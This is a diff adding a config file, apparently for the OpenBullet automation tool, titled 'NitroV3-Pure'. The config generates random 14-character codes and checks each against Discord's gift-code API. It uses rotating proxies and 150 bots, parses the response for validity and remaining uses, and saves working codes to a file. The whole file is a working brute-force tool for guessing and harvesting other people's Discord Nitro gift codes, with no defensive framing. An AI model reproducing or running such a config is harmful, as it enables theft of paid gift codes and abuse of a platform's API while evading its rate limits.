@@ -1,0 +1,78 @@
+[SETTINGS]
+{
+  "Name": "NitroV3-Pure",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-08T13:10:45.8899698-07:00",
+  "AdditionalInfo": "Generates and checks codes.",
+  "Author": "PureWasHere",
+  "Version": "1.3.5 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Transparent": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Generation FUNCTION RandomString "?i?i?i?i?i?i?i?i?i?i?i?i?i?i" -> CAP "GENE" 
+
+#Send_Code REQUEST GET "https://discordapp.com/api/v6/entitlements/gift-codes/<GENE>?with_application=false&with_subscription_plan=true" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Check_Valid KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "redeem" 
+  KEYCHAIN Failure OR 
+    KEY "Unknown Gift Code" 
+
+PARSE "<SOURCE>" LR "\"max_uses\": " "," CreateEmpty=FALSE -> VAR "MAX" 
+
+PARSE "<SOURCE>" LR "uses\": " "," CreateEmpty=FALSE -> VAR "USE" 
+
+#CONSTANT_MAX FUNCTION Constant "<MAX>" -> VAR "MAXX" 
+
+#CONSTANT_USE FUNCTION Constant "<USE>" -> VAR "USEE" 
+
+#Check_Expired KEYCHECK 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<USEE>" EqualTo "<MAXX>" 
+    KEY "<USEE>" GreaterThan "<MAXX>" 
+  KEYCHAIN Success OR 
+    KEY "<USEE>" LessThan "<MAXX>" 
+
+PARSE "<SOURCE>" LR "name\": \"" "\"" -> CAP "Type: " 
+
+PARSE "<SOURCE>" LR "\"max_uses\": " "," -> CAP "Max Uses: " 
+
+#Save_Code UTILITY File "NITRO+GAME_CODES.txt" AppendLines "<GENE>" 
+
